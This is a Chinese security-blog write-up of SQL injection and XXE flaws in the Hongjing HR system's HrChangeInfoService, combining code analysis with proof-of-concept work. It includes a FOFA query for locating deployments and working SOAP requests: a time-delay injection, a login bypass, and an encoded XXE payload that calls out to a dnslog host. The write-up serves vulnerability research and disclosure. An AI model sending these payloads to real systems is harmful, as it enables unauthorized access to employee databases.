---
title: "宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞"
source: https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html
asset_dir: assets/宏景人力资源管理系统-hrchangeinfoservice-sql注入漏洞+xxe漏洞
---

# 宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/17 08:19
- 1581浏览
- [0评论](#comment)
- 1小时阅读

深入探索

sql

hrms

软件

---

# 漏洞简介

宏景[人力资源管理系统](#)（eHR）是一款由宏景[软件](#)研发的系统。宏景人力资源管理系统的 `HrChangeInfoService` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。

计算机科学

# 影响版本

# fofa语法

> `app="HJSOFT-HCM"`

# 漏洞分析

深入探索

VPN服务

文件大小转换

编程语言教程

先看 `WEB-INF/web.xml` 里对于 `/services/*` 路由的处理由 `servlet-name` 为 `XFireServlet`来处理

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-001-1a27e7d7448e.webp)](https://image.mrxn.net/f743cba663974f0d8590e078ba089ecb.webp)

同时这里可以看到路由 `/servlet/XFireServlet/` 也是由 `XFireServlet` 来处理，二者均由 `XFireServlet` 来处理，那么就有两种方式来访问，对吧，利用这个差异可能绕过某些流量检测设备，对于 `/services/*` 路由下的一些[漏洞利用](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

前置知识关于 `WEB-INF/classes/META-INF/xfire/services.xml` 文件的作用：

人力资源

是 XFire（一个 Java Web Service 框架）用来配置 Web Service 服务的核心配置文件。它的作用是：

- 定义和描述 Web Service 服务（如服务名、实现类、接口等）。
- 配置服务的发布、协议、端点等信息。
- 控制服务的相关参数（如拦截器、传输方式等）。

简单来说，这个文件用于告诉 XFire 框架有哪些服务、怎么暴露服务以及如何处理请求。

因此我们直接去 `WEB-INF/classes/META-INF/xfire/services.xml` 查找我们本次审计的主角 `HrChangeInfoService` 部分的定义：

```
<service  xmlns="http://xfire.codehaus.org/config/1.0">
    <name>HrChangeInfoService</name>
    <namespace>http://www.hjsj.com/HrChangeInfoService</namespace>
    <serviceClass>com.hjsj.hrms.service.core.HrChangeInfoService</serviceClass>
  </service>
```

深入探索

技术文章订阅

传输层安全性协议

在线安全工具

## getChangeUsers

跟进 `HrChangeInfoService` 类，看第一个方法 `getChangeUsers` 的实现

```
public String getChangeUsers(String var1, String var2, String var3) {
        if (var2 != null && var2.length() > 0 && var3 != null && var3.length() > 0) {
            boolean var4 = this.cheakCode(var2, var3);
            if (!var4) {
                return this.returnMessLog("传入的校验用户名密码错误", 1, "");
            } else {
                String var5 = "";
                Connection var6 = null;

                String var8;
                try {
                    var6 = AdminDb.getConnection();
                    ChangeInfoInterfaces var7 = new ChangeInfoInterfaces();
                    var5 = var7.getChangeUsersXML(var6, var1);
                    return var5;
                } catch (Exception var18) {
                    var18.printStackTrace();
                    var8 = this.returnMessLog("获取人员信息错误", 1, "");
                } finally {
                    try {
                        if (var6 != null) {
                            var6.close();
                        }
                    } catch (SQLException var17) {
                    }

                }

                return var8;
            }
        } else {
            return this.returnMessLog("传入的校验用户名密码不能为空！", 1, "");
        }
    }
```

三个变量 var1、var2、var3,其中后两个进入 `cheakCode` 方法

```
private boolean cheakCode(String var1, String var2) {
        boolean var3 = false;
        Connection var4 = null;
        RowSet var5 = null;

        try {
            var4 = AdminDb.getConnection();
            String var6 = "select 1 from operuser where username='" + var1 + "' and password='" + var2 + "'";
            ContentDAO var7 = new ContentDAO(var4);
            var5 = var7.search(var6);
            if (var5.next()) {
                var3 = true;
            }
```

可以看到 var2、var3 ==> var1、var2 被直接拼接进sql语句中执行，无任何过滤和校验处理，造成[SQL注入漏](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

而 var1 会带入 `ChangeInfoInterfaces` 的 `getChangeUsersXML` 方法里

```
public String getChangeUsersXML(Connection var1, String var2) {
        StringBuffer var3 = new StringBuffer();
        var3.append("select * from " + this.emp_table + "");
        if (var2 != null && var2.length() > 0) {
            var3.append(" where flag='" + var2 + "'");
        }

        List var4 = ExecuteSQL.executeMyQuery(var3.toString());
        if (var4 == null) {
            return "";
        } else {
            var3.setLength(0);
            var3.append("select * from " + this.emp_table + " where 1=2");
            ArrayList var5 = this.getColumns(var1, var3.toString());
            String var6 = this.constructorXml(var5, var4);
            return var6;
        }
    }
```

同样被拼接进 `var3.append(" where flag='" + var2 + "'");` sql语句中，直接执行造成SQL注入漏洞。

SQL注入检测工具

其他几个同样存在类似的sql注入漏洞：

## getWhereChangeUsers

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-002-1b97230e082a.webp)](https://image.mrxn.net/4f2a09f459794833bd7b8f69b57a865f.webp)

## returnSynchroXml

### SQLi

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-003-d427eabff4db.webp)](https://image.mrxn.net/eb622b46955f499fa487e96a440fbd70.webp)

### XXE

其中 `returnSynchroUserXml` 方法还存在[XXE漏洞](https://mrxn.net/tag/XXE)

代码安全审计

```
public boolean returnSynchroUserXml(Connection var1, String var2) {
        boolean var3 = true;
        if (var2 != null && var2.length() > 0) {
            String var4 = "/hr/element";
            SAXBuilder var6 = new SAXBuilder();
            String var7 = "";
            String var8 = "";
            StringReader var9 = new StringReader(var2.toString());
            new ArrayList();
            StringBuffer var11 = new StringBuffer();

            try {
                this.doc = var6.build(var9);
```

使用 `SAXBuilder` 解析未经验证/过滤的用户输入 (`var2`) 时，未禁用外部实体解析。攻击者可通过恶意XML触发外部实体注入。

漏洞修复方案

## returnSynchroArray

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-004-57fe2ff1259d.webp)](https://image.mrxn.net/b6ac42f5d44b48679cb2f46c67040e1d.webp)

## returnSynchroString

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-005-010c153006da.webp)](https://image.mrxn.net/ee28404d9cee43859c9795912714f0c5.webp)

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-006-b3554a75ed95.webp)](https://image.mrxn.net/547a00d3ef3c4b52a1d0b68390bad42e.webp)

# 漏洞复现

## getChangeUsers

```
POST /servlet/XFireServlet/HrChangeInfoService HTTP/1.1
Host: hjsoft.mrxn.net
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrc="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrc:getChangeUsers>
         <hrc:changeFlag>-1'waitfor delay '0:0:5'-- </hrc:changeFlag>
         <hrc:username>1</hrc:username>
         <hrc:password>1'or '1'='1</hrc:password>
      </hrc:getChangeUsers>
   </soapenv:Body>
</soapenv:Envelope>
```

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-007-d218fe40ec5a.webp)](https://image.mrxn.net/4e894a428b684da4aaae623706317714.webp)

成功延时 5 秒

物流软件安全

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-008-a6756c9cda5e.webp)](https://image.mrxn.net/380600f999ae45fd850a12afdc24e237.webp)

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-009-72963a9539b7.webp)](https://image.mrxn.net/fd36cec09bf54143af7c1e7da944aeed.webp)

两种路由都是可以的噢！

网络安全

## returnSynchroXml XXE

```
POST /services/HrChangeInfoService HTTP/1.1
Host: hjsoft.mrxn.net
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrc="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrc:returnSynchroXml>
         <hrc:strString>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x66;&#x6f;&#x6f;&#x20;&#x5b;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x78;&#x78;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x74;&#x65;&#x73;&#x74;&#x2e;&#x64;&#x6e;&#x73;&#x6c;&#x6f;&#x67;&#x2e;&#x70;&#x74;&#x2f;&#x78;&#x78;&#x65;&#x5f;&#x74;&#x65;&#x73;&#x74;&#x22;&#x3e;&#x20;&#x5d;&#x3e;&#x3c;&#x66;&#x6f;&#x6f;&#x3e;&#x26;&#x78;&#x78;&#x65;&#x3b;&#x3c;&#x2f;&#x66;&#x6f;&#x6f;&#x3e;</hrc:strString>
         <hrc:username>1</hrc:username>
         <hrc:password>1'or '1'='1</hrc:password>
      </hrc:returnSynchroXml>
   </soapenv:Body>
</soapenv:Envelope>
```

在DNSLOG平台成功收到DNS请求和HTTP请求

编程

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-010-6129f01bd6d5.webp)](https://image.mrxn.net/9e38ea3d947c42a7a710b641f47fd0a3.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#XXE](https://mrxn.net/tag/XXE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.getChangeUsers](#toc-4-1-)
- [4.2.getWhereChangeUsers](#toc-4-2-)
- [4.3.returnSynchroXml](#toc-4-3-)
- [4.3.1.SQLi](#toc-4-3-1-)
- [4.3.2.XXE](#toc-4-3-2-)
- [4.4.returnSynchroArray](#toc-4-4-)
- [4.5.returnSynchroString](#toc-4-5-)
- [5.漏洞复现](#toc-5-)
- [5.1.getChangeUsers](#toc-5-1-)
- [5.2.returnSynchroXml XXE](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
